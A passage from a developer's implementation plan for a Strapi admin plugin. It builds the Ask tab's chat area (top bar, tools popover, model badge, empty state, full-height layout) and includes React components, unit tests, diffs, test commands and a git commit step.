import { renderInTheme } from './render';

describe('ModelBadge', () => {
  it('names the model by its ID, as the status gave it', () => {
    renderInTheme(<ModelBadge model="claude-sonnet-5-5" />);
    expect(screen.getByText('claude-sonnet-5-5')).toBeTruthy();
  });

  it('draws the ID in capitals: the badge is the design system\'s, whose text is uppercase', () => {
    renderInTheme(<ModelBadge model="claude-sonnet-5-5" />);
    const badge = screen.getByText('claude-sonnet-5-5');
    const css = Array.from(document.querySelectorAll('style'))
      .map((style) => style.textContent ?? '')
      .join('\n');
    const classes = Array.from(badge.classList);
    expect(classes.some((name) => new RegExp(`\\.${name}[^{}]*\\{[^}]*text-transform:uppercase`).test(css))).toBe(true);
  });

  it('says "Model" in a tooltip when the pointer rests on it', async () => {
    renderInTheme(<ModelBadge model="claude-sonnet-5-5" />);
    await userEvent.hover(screen.getByText('claude-sonnet-5-5'));
    expect((await screen.findAllByText('Model', {}, { timeout: 3000 })).length).toBeGreaterThan(0);
  });
});
```

`test/unit/maison-tabs.test.ts`:

```diff
@@
 import { describe, expect, it } from 'vitest';
-import { LIST_TABS, PAGE_SUBTITLE, TAB_LABELS, selectTab, tabCounts, tabLabel, visibleTabs } from '../../admin/src/tabs';
+import { LIST_TABS, PAGE_SUBTITLE, TAB_LABELS, fillsPage, selectTab, showsDemoData, tabCounts, tabLabel, visibleTabs } from '../../admin/src/tabs';
 import { COUNTS } from '../../admin/src/inquiries';
 import { isSummary } from '../../admin/src/inquiries';
 import { world } from './fake-inquiries';
@@
     expect(selectTab(ALL, new URLSearchParams('').get('tab'))).toBe('requests');
   });
 });
+
+describe('the page while Ask is open', () => {
+  it('fills the height under its header on the Ask tab, and on no other: the lists scroll the page', () => {
+    expect(fillsPage('ask')).toBe(true);
+    for (const tab of LIST_TABS) expect(fillsPage(tab), tab).toBe(false);
+    expect(fillsPage(undefined)).toBe(false);
+  });
+
+  it('hides the Demo data block on the Ask tab, where the chat takes the height, and shows it on every other tab for an admin who may manage it', () => {
+    expect(showsDemoData({ canManage: true, activeTab: 'ask' })).toBe(false);
+    for (const tab of LIST_TABS) expect(showsDemoData({ canManage: true, activeTab: tab }), tab).toBe(true);
+  });
+
+  it('shows the Demo data block alone for an admin who can only manage it: they have no tab', () => {
+    expect(showsDemoData({ canManage: true, activeTab: undefined })).toBe(true);
+  });
+
+  it('never shows it to an admin who may not manage the demo data', () => {
+    for (const activeTab of [...LIST_TABS, 'ask', undefined] as const) expect(showsDemoData({ canManage: false, activeTab }), String(activeTab)).toBe(false);
+  });
+});
```

- [ ] **Step 2: Run them to see them fail**

Run: `npm test -- test/unit/top-bar-icon.test.tsx test/unit/tools-popover.test.tsx test/unit/empty-state.test.tsx test/unit/chat-area.test.tsx test/unit/model-badge.test.tsx test/unit/maison-tabs.test.ts`
Expected: FAIL, `Test Files  6 failed (6)` and `Tests  4 failed | 34 passed (38)`. The components and the two page helpers do not exist yet.

- [ ] **Step 3: Write the top bar button and the frame**

`TopBarIcon.tsx` is the reference's `TopBarIcon.tsx` with its History, Tools and New chat icons (the Memory and Note icons are not copied). The one addition is `emphasis`: words after the icon, in the primary colour, for New chat when the chat is too long to go on. `ChatFrame.tsx` is the reference's `ChatLayout`, `ChatColumn`, `ChatTopBar` and `TopBarSpacer` from `ChatPanel.tsx:61-111`, with the two-way height rule from the Decisions above.

Create `admin/src/components/assistant/TopBarIcon.tsx`:

```tsx
import type { ReactNode } from 'react';

import styled, { css } from 'styled-components';

/**
 * The chat's top-bar controls, copied from strapi-plugin-tanstack-ai 1.6.0 (`TopBarIcon.tsx`): a 32px square with a 16px icon, the same
 * hover and open looks, and a label that is both the accessible name and a tooltip, drawn in CSS from `data-tip`. The tooltip shows after
 * half a second on hover or keyboard focus, so it does not flicker as the pointer crosses the bar, and it goes at once on the way out.
 *
 * One addition: `emphasis`. A button that has words to say, such as New chat when the chat is too long to go on, shows them after its icon,
 * in the primary colour, so staff see what to press.
 */
const Button = styled.button<{ $active?: boolean; $emphasis?: boolean }>`
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  min-width: 32px;
  height: 32px;
  padding: ${({ $emphasis }) => ($emphasis ? '0 12px 0 10px' : '0')};
  border: 1px solid ${({ $active, theme }) => ($active ? theme.colors.primary600 : theme.colors.neutral200)};
  border-radius: 4px;
  background: ${({ $active, theme }) => ($active ? theme.colors.primary100 : theme.colors.neutral0)};
  color: ${({ $active, theme }) => ($active ? theme.colors.primary600 : theme.colors.neutral600)};
  font-size: 13px;
  font-weight: 600;
  white-space: nowrap;
  cursor: pointer;
  flex-shrink: 0;

  &:hover:not(:disabled) {
    background: ${({ theme }) => theme.colors.neutral100};
    color: ${({ theme }) => theme.colors.primary600};
    border-color: ${({ theme }) => theme.colors.primary600};
  }

  ${({ $emphasis, theme }) =>
    $emphasis &&
    css`
      border-color: ${theme.colors.primary600};
      background: ${theme.colors.primary600};
      color: ${theme.colors.neutral0};

      &:hover:not(:disabled) {
        background: ${theme.colors.buttonPrimary500};
        border-color: ${theme.colors.buttonPrimary500};
        color: ${theme.colors.neutral0};
      }
    `}

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }

  svg {
    width: 16px;
    height: 16px;
  }

  /* The label, drawn from the same string as the accessible name. */
  &::after {
    content: attr(data-tip);
    position: absolute;
    top: calc(100% + 6px);
    left: 50%;
    transform: translateX(-50%);
    z-index: 40;
    padding: 4px 8px;
    border-radius: 4px;
    background: ${({ theme }) => theme.colors.neutral800};
    color: ${({ theme }) => theme.colors.neutral0};
    font-size: 11px;
    font-weight: 400;
    white-space: nowrap;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.12s ease;
  }

  &:hover::after,
  &:focus-visible::after {
    opacity: 1;
    /* Only on the way in. Leaving is immediate. */
    transition-delay: 0.5s;
  }

  @media (prefers-reduced-motion: reduce) {
    &::after {
      transition: none;
    }
  }
`;

interface TopBarIconProps {
  /** Used as both the accessible name and the tooltip text. */
  label: string;
  onClick: () => void;
  children: ReactNode;
  active?: boolean;
  disabled?: boolean;
  /** For a button that opens something: whether it is open. Sets `aria-expanded`. */
  expanded?: boolean;
  /** Words to show after the icon, in the primary colour. The label stays the accessible name. */
  emphasis?: string;
}

export const TopBarIcon = ({ label, onClick, children, active, disabled, expanded, emphasis }: TopBarIconProps) => (
  <Button
    type="button"
    $active={active}
    $emphasis={Boolean(emphasis)}
    onClick={onClick}
    disabled={disabled}
    aria-label={label}
    data-tip={label}
    {...(expanded === undefined ? {} : { 'aria-expanded': expanded })}
  >
    {children}
    {emphasis}
  </Button>
);

/*
 * The reference plugin's own icons, copied so the two panels look like siblings. They are inline and not from @strapi/icons, because
 * these are the exact shapes it uses, and picking near-equivalents from an icon set is how two things that should match stop matching.
 */

/** A panel beside a page: the history sidebar. */
export const HistoryIcon = () => (
  <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" aria-hidden="true">
    <rect x="1" y="2" width="14" height="12" rx="1.5" />
    <line x1="5.5" y1="2" x2="5.5" y2="14" />
  </svg>
);

/** A pencil: the list of tools. */
export const ToolsIcon = () => (
  <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
    <path d="M9.5 2.5L13 6l-7 7H2.5v-3.5l7-7z" />
    <path d="M8 4l4 4" />
  </svg>
);

/** A plus: a new chat. */
export const NewChatIcon = () => (
  <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" aria-hidden="true">
    <path d="M8 3v10M3 8h10" />
  </svg>
);
```

Create `admin/src/components/assistant/ChatFrame.tsx`:

```tsx
import styled from 'styled-components';

/**
 * The chat area and its pieces, copied from strapi-plugin-tanstack-ai 1.6.0 (`ChatPanel.tsx`): a white rectangle with a 4px radius and the
 * table shadow, holding the sidebar and the chat column, and in the column the top bar, the messages and the composer.
 */

/**
 * Takes the height the page has left, with no calc() against 100vh: that was a guess at the height of what is above it, and it drifted.
 * The page is a flex column while Ask is open, so this takes what remains. `min-height: 0` is the part that is easy to leave out: a flex
 * child will not shrink below its content, so without it the messages would push the composer off the bottom instead of scrolling.
 *
 * Below the large breakpoint (1080px) the admin's content area has no height of its own, so there is nothing to fill: the chat area is
 * then 70% of the window's height, and never less than 420px.
 */
export const ChatLayout = styled.div`
  display: flex;
  flex-direction: row;
  flex: 0 0 auto;
  height: 70vh;
  min-height: 420px;
  border-radius: 4px;
  overflow: hidden;
  box-shadow: ${({ theme }) => theme.shadows.tableShadow};
  background: ${({ theme }) => theme.colors.neutral0};

  ${({ theme }) => theme.breakpoints.large} {
    flex: 1 1 0%;
    height: auto;
    min-height: 0;
  }
`;

export const ChatColumn = styled.div`
  display: flex;
  flex-direction: column;
  flex: 1;
  min-width: 0;
`;

export const ChatTopBar = styled.div`
  display: flex;
  align-items: center;
  padding: 8px 16px;
  border-bottom: 1px solid ${({ theme }) => theme.colors.neutral200};
  gap: 8px;
`;

/** Pushes what follows to the right-hand end of the bar. */
export const TopBarSpacer = styled.div`
  flex: 1 1 auto;
  min-width: 0;
`;
```

- [ ] **Step 4: Write the model badge, the tools list and the empty state**

`ModelBadge` is the reference's, with the tooltip "Model". `ToolsPopover` is the reference's `ToolSourcePicker` without the switches, the saved choice and what it sends with each request: one group, "Read only", a line at the top, and for each tool its label, its one line (`toolNoteOf`) and its name in a code chip. It closes on a press outside and on Escape. `EmptyState` is the reference's centred title and sentence, with Maison's words and the three starters.

Create `admin/src/components/assistant/ModelBadge.tsx`:

```tsx
import { Badge, Tooltip } from '@strapi/design-system';

/**
 * The model the chat runs on, as the status names it, for example CLAUDE-SONNET-5-5: the badge draws capitals. The text is the model's
 * ID as it is. Copied from strapi-plugin-tanstack-ai 1.6.0 (`ModelBadge`), with the tooltip "Model" added.
 */
export const ModelBadge = ({ model }: { model: string }) => (
  <Tooltip label="Model">
    <span>
      <Badge>{model}</Badge>
    </span>
  </Tooltip>
);
```

Create `admin/src/components/assistant/ToolsPopover.tsx`:

```tsx
import { useEffect, useRef, useState } from 'react';

import { Typography } from '@strapi/design-system';
import styled from 'styled-components';

import { toolNoteOf, type ToolInfo } from '../../assistant';
import { ToolsIcon, TopBarIcon } from './TopBarIcon';

/**
 * What tools the chat has, for staff to read. Copied from strapi-plugin-tanstack-ai 1.6.0 (`ToolSourcePicker.tsx`) without the switches, the
 * saved choice and what goes to the server with each request: Maison's tools are fixed. They are the tools this admin's chat really gets, as
 * the status lists them, so a role that may read less sees less.
 *
 * Each row has the tool's label, one line about it, and its name in a code chip. The popover closes on a click outside it and on Escape.
 */

const Wrapper = styled.div`
  position: relative;
  flex-shrink: 0;
`;

const Popover = styled.div`
  position: absolute;
  top: 36px;
  left: 0;
  z-index: 20;
  width: 320px;
  max-height: 420px;
  overflow-y: auto;
  padding: 8px 0;
  border: 1px solid ${({ theme }) => theme.colors.neutral200};
  border-radius: 4px;
  background: ${({ theme }) => theme.colors.neutral0};
  box-shadow: ${({ theme }) => theme.shadows.popupShadow};
`;

const Intro = styled.div`
  padding: 2px 12px 8px;
`;

const GroupHeader = styled.div`
  padding: 6px 12px 2px;
`;

const ToolRow = styled.div`
  padding: 6px 12px;
`;

const ToolName = styled.code`
  display: inline-block;
  margin-top: 2px;
  padding: 1px 5px;
  border-radius: 3px;
  background: ${({ theme }) => theme.colors.neutral150};
  color: ${({ theme }) => theme.colors.neutral700};
  font-size: 11px;
  word-break: break-all;
`;

export const ToolsPopover = ({ tools }: { tools: readonly ToolInfo[] }) => {
  const [open, setOpen] = useState(false);
  const wrapper = useRef<HTMLDivElement>(null);

  // Closes on a click outside, and on Escape. Without the key handler, someone who does not use a mouse could not close the list.
  useEffect(() => {
    if (!open) return;
    const onPointerDown = (event: MouseEvent) => {
      if (wrapper.current && !wrapper.current.contains(event.target as Node)) setOpen(false);
    };
    const onKeyDown = (event: KeyboardEvent) => {
      if (event.key === 'Escape') setOpen(false);
    };
    document.addEventListener('mousedown', onPointerDown);
    document.addEventListener('keydown', onKeyDown);
    return () => {
      document.removeEventListener('mousedown', onPointerDown);
      document.removeEventListener('keydown', onKeyDown);
    };
  }, [open]);

  return (
    <Wrapper ref={wrapper}>
      <TopBarIcon label={`Tools (${tools.length})`} active={open} expanded={open} onClick={() => setOpen((value) => !value)}>
        <ToolsIcon />
      </TopBarIcon>
      {open && (
        <Popover role="dialog" aria-label="Tools">
          <Intro>
            <Typography variant="pi" textColor="neutral600">
              The assistant looks things up. It never sends, confirms or changes anything.
            </Typography>
          </Intro>
          <GroupHeader>
            <Typography variant="sigma" textColor="neutral600">
              Read only
            </Typography>
          </GroupHeader>
          {tools.length === 0 && (
            <ToolRow>
              <Typography variant="pi" textColor="neutral600">
                Your role has no tools, so the assistant can&apos;t look anything up.
              </Typography>
            </ToolRow>
          )}
          {tools.map((tool) => {
            const note = toolNoteOf(tool.name);
            return (
              <ToolRow key={tool.name}>
                <Typography variant="omega" textColor="neutral800" fontWeight="bold">
                  {tool.label}
                </Typography>
                {note && (
                  <Typography variant="pi" textColor="neutral600" display="block">
                    {note}
                  </Typography>
                )}
                <ToolName>{tool.name}</ToolName>
              </ToolRow>
            );
          })}
        </Popover>
      )}
    </Wrapper>
  );
};
```

Create `admin/src/components/assistant/EmptyState.tsx`:

```tsx
import { Box, Button, Flex, Typography } from '@strapi/design-system';
import styled from 'styled-components';

import { STARTERS } from '../../assistant';

/**
 * What the message list shows before the first message: a title, one sentence, and the three starters. Centred in both directions, as in
 * strapi-plugin-tanstack-ai 1.6.0 (`MessageList.tsx`), which has no starters: they are Maison's.
 */
const Wrapper = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  flex: 1;
  text-align: center;
`;

const Sentence = styled.div`
  max-width: 520px;
`;

interface EmptyStateProps {
  /** A starter was pressed: its text is sent as it is. */
  onStarter: (text: string) => void;
  /** Whether a send of this text would work now. A starter that would not is switched off. */
  canStart: (text: string) => boolean;
}

export const EmptyState = ({ onStarter, canStart }: EmptyStateProps) => (
  <Wrapper>
    <Typography variant="beta" textColor="neutral400">
      Ask Maison
    </Typography>
    <Box paddingTop={2}>
      <Sentence>
        <Typography variant="omega" textColor="neutral500">
          Ask about visit requests, customer questions and inquiries. The assistant looks things up and never sends, confirms or changes anything.
        </Typography>
      </Sentence>
    </Box>
    <Box paddingTop={5}>
      <Flex role="group" aria-label="Suggestions" gap={2} wrap="wrap" justifyContent="center">
        {STARTERS.map((starter) => (
          <Button key={starter} size="S" variant="secondary" disabled={!canStart(starter)} onClick={() => onStarter(starter)}>
            {starter}
          </Button>
        ))}
      </Flex>
    </Box>
  </Wrapper>
);
```

- [ ] **Step 5: Write the chat area**

Create `admin/src/components/assistant/ChatArea.tsx`. It is the white rectangle with the chat column in it. From the left, the top bar has the tools, the model, and at the right end New chat. The reference's context badge, "local" marker, memories and notes are not copied.

```tsx
import type { ReactNode } from 'react';

import type { ToolInfo } from '../../assistant';
import { ChatColumn, ChatLayout, ChatTopBar, TopBarSpacer } from './ChatFrame';
import { ModelBadge } from './ModelBadge';
import { ToolsPopover } from './ToolsPopover';
import { NewChatIcon, TopBarIcon } from './TopBarIcon';

interface ChatAreaProps {
  model: string;
  tools: readonly ToolInfo[];
  /** Whether there is a chat to start over from: messages, or a notice. With none, New chat does nothing and is switched off. */
  canStartOver: boolean;
  /** The notice under the messages offers a new chat as the way on: the button says so, in words. */
  newChatOffered: boolean;
  onNewChat: () => void;
  /** The chat column under the top bar: the messages, the error box and the composer. */
  children: ReactNode;
}

/**
 * The chat area: a white rectangle with the chat column in it, and in the column the top bar and what is under it. From the left, the top
 * bar has the tools, the model, and at the right end New chat. strapi-plugin-tanstack-ai's context badge, "local" marker, memories and
 * notes are not copied.
 */
export const ChatArea = ({ model, tools, canStartOver, newChatOffered, onNewChat, children }: ChatAreaProps) => (
  <ChatLayout>
    <ChatColumn>
      <ChatTopBar>
        <ToolsPopover tools={tools} />
        <ModelBadge model={model} />
        <TopBarSpacer />
        <TopBarIcon label="New chat" disabled={!canStartOver} emphasis={newChatOffered ? 'New chat' : undefined} onClick={onNewChat}>
          <NewChatIcon />
        </TopBarIcon>
      </ChatTopBar>
      {children}
    </ChatColumn>
  </ChatLayout>
);
```

- [ ] **Step 6: Add the two page rules**

`admin/src/tabs.ts`:

```diff
@@
  */
 export const selectTab = (tabs: readonly MaisonTab[], requested: string | null | undefined): MaisonTab | undefined =>
   tabs.find((tab) => tab === requested) ?? tabs[0];
+
+/**
+ * Whether the page fills the height under its header: while Ask is open, so the chat area can take what is left and only its message
+ * list scrolls. The other tabs are lists, and the page scrolls for them.
+ */
+export const fillsPage = (activeTab: MaisonTab | undefined): boolean => activeTab === 'ask';
+
+/** Whether the Demo data block shows: for an admin who may manage it, on every tab but Ask, where the chat takes the height. */
+export const showsDemoData = ({ canManage, activeTab }: { canManage: boolean; activeTab: MaisonTab | undefined }): boolean => canManage && activeTab !== 'ask';
```

- [ ] **Step 7: Put the Ask tab in the chat area**

`AskTab.tsx`: the tab's states and the provider's API are as they were. What changes is what it draws: the chat area, with the empty state (or the old `ChatMessages`) in a scrolling box, and the old text box and buttons under it. The heading and the sentence that named the model are gone: the model is in the top bar, and the read-only sentence is in the empty state and the tools list. New chat moves to the top bar. Task 4 and Task 5 replace what is inside the area.

```diff
@@
 import * as React from 'react';
 
 import { Box, Button, Flex, Textarea, Typography } from '@strapi/design-system';
+import styled from 'styled-components';
 
-import { STARTERS, askTabState, canSend, composerButtons, followsNewest, shouldSendOnKey, showsWorking, type MessageSource } from '../../assistant';
+import { askTabState, canSend, composerButtons, followsNewest, shouldSendOnKey, showsWorking, type MessageSource } from '../../assistant';
+import { ChatArea } from './ChatArea';
 import { ChatMessages } from './ChatMessages';
+import { EmptyState } from './EmptyState';
 import { useAssistant } from './AssistantProvider';
 
-/** The messages scroll in their own box, so the text box, Send, Stop and New chat stay on the screen however long the chat gets. */
-const MESSAGE_BOX = { maxHeight: '55vh', overflowY: 'auto' } as const;
+/** The messages scroll in their own box, which takes the height between the top bar and the text box. */
+const MessageBox = styled.div`
+  display: flex;
+  flex-direction: column;
+  flex: 1;
+  min-height: 0;
+  overflow-y: auto;
+  padding: 24px;
+`;
 
 /**
  * The Ask tab: a chat for staff about requests, questions and inquiries. The chat itself, and the text staff have typed and not
@@
   };
 
   return (
-    <Flex direction="column" alignItems="stretch" gap={4}>
-      <Flex direction="column" alignItems="flex-start" gap={1}>
-        <Typography variant="delta" tag="h2">
-          Ask
-        </Typography>
-        <Typography variant="pi" textColor="neutral600">
-          Ask about requests, questions and inquiries. The assistant looks things up and never sends, confirms or changes anything. Model: {state.model}.
-        </Typography>
-      </Flex>
+    <ChatArea
+      model={state.model}
+      tools={state.tools}
+      canStartOver={assistant.messages.length > 0 || notice !== null || note !== null}
+      newChatOffered={notice?.newChat === true}
+      onNewChat={assistant.newChat}
+    >
+      <MessageBox
+        ref={list}
+        role="region"
+        aria-label="Chat messages"
+        // Keyboard users scroll the box with the arrow keys once it has the focus.
+        tabIndex={0}
+        onScroll={(event: React.UIEvent<HTMLDivElement>) => {
+          following.current = followsNewest(event.currentTarget);
+        }}
+      >
+        {assistant.messages.length === 0 ? <EmptyState onStarter={(starter) => submit(starter, 'starter')} canStart={(starter) => canSend({ text: starter, busy, ready })} /> : <ChatMessages messages={assistant.messages} />}
+      </MessageBox>
 
-      {assistant.messages.length === 0 && (
-        <Flex role="group" aria-label="Suggestions" gap={2} wrap="wrap">
-          {STARTERS.map((starter) => (
-            <Button key={starter} size="S" variant="secondary" disabled={!canSend({ text: starter, busy, ready })} onClick={() => submit(starter, 'starter')}>
-              {starter}
-            </Button>
-          ))}
-        </Flex>
-      )}
-
-      {assistant.messages.length > 0 && (
-        <Box
-          ref={list}
-          role="region"
-          aria-label="Chat messages"
-          // Keyboard users scroll the box with the arrow keys once it has the focus.
-          tabIndex={0}
-          style={MESSAGE_BOX}
-          onScroll={(event: React.UIEvent<HTMLDivElement>) => {
-            following.current = followsNewest(event.currentTarget);
-          }}
-        >
-          <ChatMessages messages={assistant.messages} />
-        </Box>
-      )}
-      {showsWorking(busy, assistant.messages) && (
-        <Typography role="status" textColor="neutral600">
-          The assistant is working…
-        </Typography>
-      )}
-
-      {notice && (
-        <Typography role="alert" textColor="danger600">
-          {notice.text}
-        </Typography>
-      )}
-      {note && (
-        <Typography role="status" textColor="neutral600">
-          {note}
-        </Typography>
-      )}
-
-      <Flex direction="column" alignItems="stretch" gap={2}>
+      <Flex direction="column" alignItems="stretch" gap={3} padding={4}>
+        {showsWorking(busy, assistant.messages) && (
+          <Typography role="status" textColor="neutral600">
+            The assistant is working…
+          </Typography>
+        )}
+        {notice && (
+          <Typography role="alert" textColor="danger600">
+            {notice.text}
+          </Typography>
+        )}
+        {note && (
+          <Typography role="status" textColor="neutral600">
+            {note}
+          </Typography>
+        )}
         <Textarea
           ref={box}
           aria-label="Your message"
@@
             }
           }}
         />
-        <Flex gap={2} justifyContent="space-between">
+        <Flex gap={2}>
           {/* Send and Stop are two buttons side by side, each with its own key: a second click on Send, as in a double click, lands on a switched-off Send and never on Stop. */}
-          <Flex gap={2}>
-            <Button key="send" disabled={buttons.sendDisabled} onClick={() => submit(draft, 'box')}>
-              Send
-            </Button>
-            {buttons.showStop && (
-              <Button key="stop" variant="secondary" onClick={assistant.stop}>
-                Stop
-              </Button>
-            )}
-          </Flex>
-          {(assistant.messages.length > 0 || notice) && (
-            <Button variant={notice?.newChat ? 'default' : 'tertiary'} onClick={assistant.newChat}>
-              New chat
+          <Button key="send" disabled={buttons.sendDisabled} onClick={() => submit(draft, 'box')}>
+            Send
+          </Button>
+          {buttons.showStop && (
+            <Button key="stop" variant="secondary" onClick={assistant.stop}>
+              Stop
             </Button>
           )}
         </Flex>
       </Flex>
-    </Flex>
+    </ChatArea>
   );
 };
```

- [ ] **Step 8: Make the page fill the height while Ask is open**

`admin/src/pages/MaisonPage.tsx`. While Ask is the open tab, `Page.Main`, the content `Box`, the `Flex`, `Tabs.Root`, `Tabs.Content` and the content's `Box` are each a flex column with `flex: 1` and `min-height: 0`, so the chat area gets what is left under the header and the tabs. The Demo data block is not drawn on Ask. `Layouts.Content` is replaced by a `Box` with the same padding: it is the same element for every tab, so the provider inside it is never remounted.

```diff
@@
 import { RequestCounts } from '../components/RequestCounts';
 import { RequestsBoard } from '../components/RequestsBoard';
 import { PERMISSIONS } from '../permissions';
-import { PAGE_SUBTITLE, selectTab, tabCounts, tabLabel, visibleTabs } from '../tabs';
+import { PAGE_SUBTITLE, fillsPage, selectTab, showsDemoData, tabCounts, tabLabel, visibleTabs } from '../tabs';
 import { useInquiriesSummary } from '../useInquiriesSummary';
 import { useOpenQuestions } from '../useOpenQuestions';
 import { useRequestsSummary } from '../useRequestsSummary';
+
+/**
+ * While Ask is open, each box from the page down to the chat area is a flex column that takes the height left under the one above it, and
+ * may shrink below its content (`min-height: 0`). The admin's content area is a flex column with a height of its own, so the page fills it
+ * and only the message list scrolls. No height is worked out from the header's: that is what drifts.
+ */
+const FILL = { display: 'flex', flexDirection: 'column', flex: 1, minHeight: 0 } as const;
 
 const MaisonPage = () => {
   const { allowedActions, isLoading } = useRBAC(PERMISSIONS.sections);
@@
     canUse: allowedActions.canUse,
   });
   const activeTab = selectTab(tabs, searchParams.get('tab'));
+  const fill = fillsPage(activeTab);
   const waiting = tabCounts({ requests: requests.summary, questions: questions.count, inquiries: inquiries.summary });
 
   const tabsRoot = activeTab && (
@@
       value={activeTab}
       // The address is replaced, not added to: switching tabs isn't a place to go back to.
       onValueChange={(tab) => setSearchParams({ tab }, { replace: true })}
+      style={fill ? FILL : undefined}
     >
       <Tabs.List aria-label="Maison">
         {tabs.map((tab) => (
@@
         </Tabs.Content>
       )}
       {tabs.includes('ask') && (
-        <Tabs.Content value="ask">
-          <Box paddingTop={6}>
+        <Tabs.Content value="ask" style={FILL}>
+          <Box paddingTop={6} style={FILL}>
             <AskTab />
           </Box>
         </Tabs.Content>
@@
   );
 
   return (
-    <Page.Main>
+    <Page.Main style={fill ? FILL : undefined}>
       <Page.Title>Maison</Page.Title>
       <Layouts.Header title="Maison" subtitle={PAGE_SUBTITLE} />
-      <Layouts.Content>
-        <Flex direction="column" alignItems="stretch" gap={8}>
+      {/*
+        What Layouts.Content is (the same side padding, and the top padding on a small screen), as a Box that can fill the height while Ask
+        is open. It is always this Box, never Layouts.Content for one tab and this for another: a different element would unmount the
+        chat's provider, which sits inside it, on every change of tab.
+      */}
+      <Box paddingLeft={{ initial: 4, medium: 6, large: 10 }} paddingRight={{ initial: 4, medium: 6, large: 10 }} paddingTop={{ initial: 4, medium: 0 }} paddingBottom={fill ? 6 : 0} style={fill ? FILL : undefined}>
+        <Flex direction="column" alignItems="stretch" gap={8} style={fill ? { flex: 1, minHeight: 0 } : undefined}>
           {/* The chat lives above the tabs, so it stays when staff look at a list and come back. Only admins who may use it have one. */}
           {allowedActions.canUse === true ? <AssistantProvider>{tabsRoot}</AssistantProvider> : tabsRoot}
-          {allowedActions.canManage && <DemoData onChange={refresh} />}
+          {showsDemoData({ canManage: allowedActions.canManage === true, activeTab }) && <DemoData onChange={refresh} />}
         </Flex>
-      </Layouts.Content>
+      </Box>
     </Page.Main>
   );
 };
```

- [ ] **Step 9: Run the tests, then everything**

Run: `npm test -- test/unit/top-bar-icon.test.tsx test/unit/tools-popover.test.tsx test/unit/empty-state.test.tsx test/unit/chat-area.test.tsx test/unit/model-badge.test.tsx test/unit/maison-tabs.test.ts`
Expected: PASS, `Test Files  6 passed (6)` and `Tests  68 passed (68)`.

Run: `npm test`
Expected: PASS, `Test Files  101 passed (101)` and `Tests  2935 passed (2935)`.

Run: `npm run test:ts:back` and `npm run test:ts:front`
Expected: both finish with no error output.

Run: `rm -rf dist && npm run build`
Expected: it ends with `Build complete!`.

Run: `node scripts/check-esm-import.mjs`
Expected: exit 0, with one `ok` line for each of `dist/server/index.js` and `dist/server/index.mjs` saying there is no static load of `@tanstack/ai`.

Run: `node ../../../scripts/share-strapi-utils.mjs --check`
Expected: `Maison and oauth-mcp-manager share Strapi core's @strapi/utils.`

- [ ] **Step 10: (Paul) Look at it in the browser**

Skip this step and say so in the report. Paul runs it with the checklist in Task 8: the chat area fills the height under the tabs with no page scroll while Ask is open, the Demo data block is gone on Ask and back on the other tabs, and the top bar, the tools list, the badge and New chat look like the reference's in the light and the dark theme.

- [ ] **Step 11: Prove the tests can fail**

Make each change, run the files named, see them fail, and undo the change.

In `ToolsPopover.tsx`, remove the Escape handling: delete `if (event.key === 'Escape') setOpen(false);`.

Run: `npm test -- test/unit/tools-popover.test.tsx`
Expected: FAIL, among others: `ToolsPopover > closes when the button is pressed again, on Escape, and on a press outside`.

In `ChatArea.tsx`, always show the words on New chat: `emphasis='New chat'`.

Run: `npm test -- test/unit/chat-area.test.tsx`
Expected: FAIL, among others: `ChatArea > shows the words "New chat" on the button when the notice offers a new chat as the way on, and only then`.

In `tabs.ts`, show Demo data on Ask too: `canManage`.

Run: `npm test -- test/unit/maison-tabs.test.ts`
Expected: FAIL, among others: `the page while Ask is open > hides the Demo data block on the Ask tab, where the chat takes the height, and shows it on every other tab for an admin who may manage it`.

- [ ] **Step 12: Commit**

From `/Users/paul/work/maison-demo`:

```bash
git add strapi/src/plugins/maison/admin/src/components/assistant/AskTab.tsx strapi/src/plugins/maison/admin/src/components/assistant/ChatArea.tsx strapi/src/plugins/maison/admin/src/components/assistant/ChatFrame.tsx strapi/src/plugins/maison/admin/src/components/assistant/EmptyState.tsx strapi/src/plugins/maison/admin/src/components/assistant/ModelBadge.tsx strapi/src/plugins/maison/admin/src/components/assistant/ToolsPopover.tsx strapi/src/plugins/maison/admin/src/components/assistant/TopBarIcon.tsx strapi/src/plugins/maison/admin/src/pages/MaisonPage.tsx strapi/src/plugins/maison/admin/src/tabs.ts strapi/src/plugins/maison/test/unit/chat-area.test.tsx strapi/src/plugins/maison/test/unit/empty-state.test.tsx strapi/src/plugins/maison/test/unit/maison-tabs.test.ts strapi/src/plugins/maison/test/unit/model-badge.test.tsx strapi/src/plugins/maison/test/unit/tools-popover.test.tsx strapi/src/plugins/maison/test/unit/top-bar-icon.test.tsx
git commit -m "maison: the Ask tab's chat area: top bar, tools list, model badge, empty state, and a page that fills the height" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>" -- strapi/src/plugins/maison/admin/src/components/assistant/AskTab.tsx strapi/src/plugins/maison/admin/src/components/assistant/ChatArea.tsx strapi/src/plugins/maison/admin/src/components/assistant/ChatFrame.tsx strapi/src/plugins/maison/admin/src/components/assistant/EmptyState.tsx strapi/src/plugins/maison/admin/src/components/assistant/ModelBadge.tsx strapi/src/plugins/maison/admin/src/components/assistant/ToolsPopover.tsx strapi/src/plugins/maison/admin/src/components/assistant/TopBarIcon.tsx strapi/src/plugins/maison/admin/src/pages/MaisonPage.tsx strapi/src/plugins/maison/admin/src/tabs.ts strapi/src/plugins/maison/test/unit/chat-area.test.tsx strapi/src/plugins/maison/test/unit/empty-state.test.tsx strapi/src/plugins/maison/test/unit/maison-tabs.test.ts strapi/src/plugins/maison/test/unit/model-badge.test.tsx strapi/src/plugins/maison/test/unit/tools-popover.test.tsx strapi/src/plugins/maison/test/unit/top-bar-icon.test.tsx
```


---

### Task 4: The messages: bubbles, Markdown answers, tool boxes and the waiting dots

**Group:** Step 1b. After this task the Ask tab draws the chat as the reference does. The text box and its buttons are still the old ones: Task 5 replaces them.

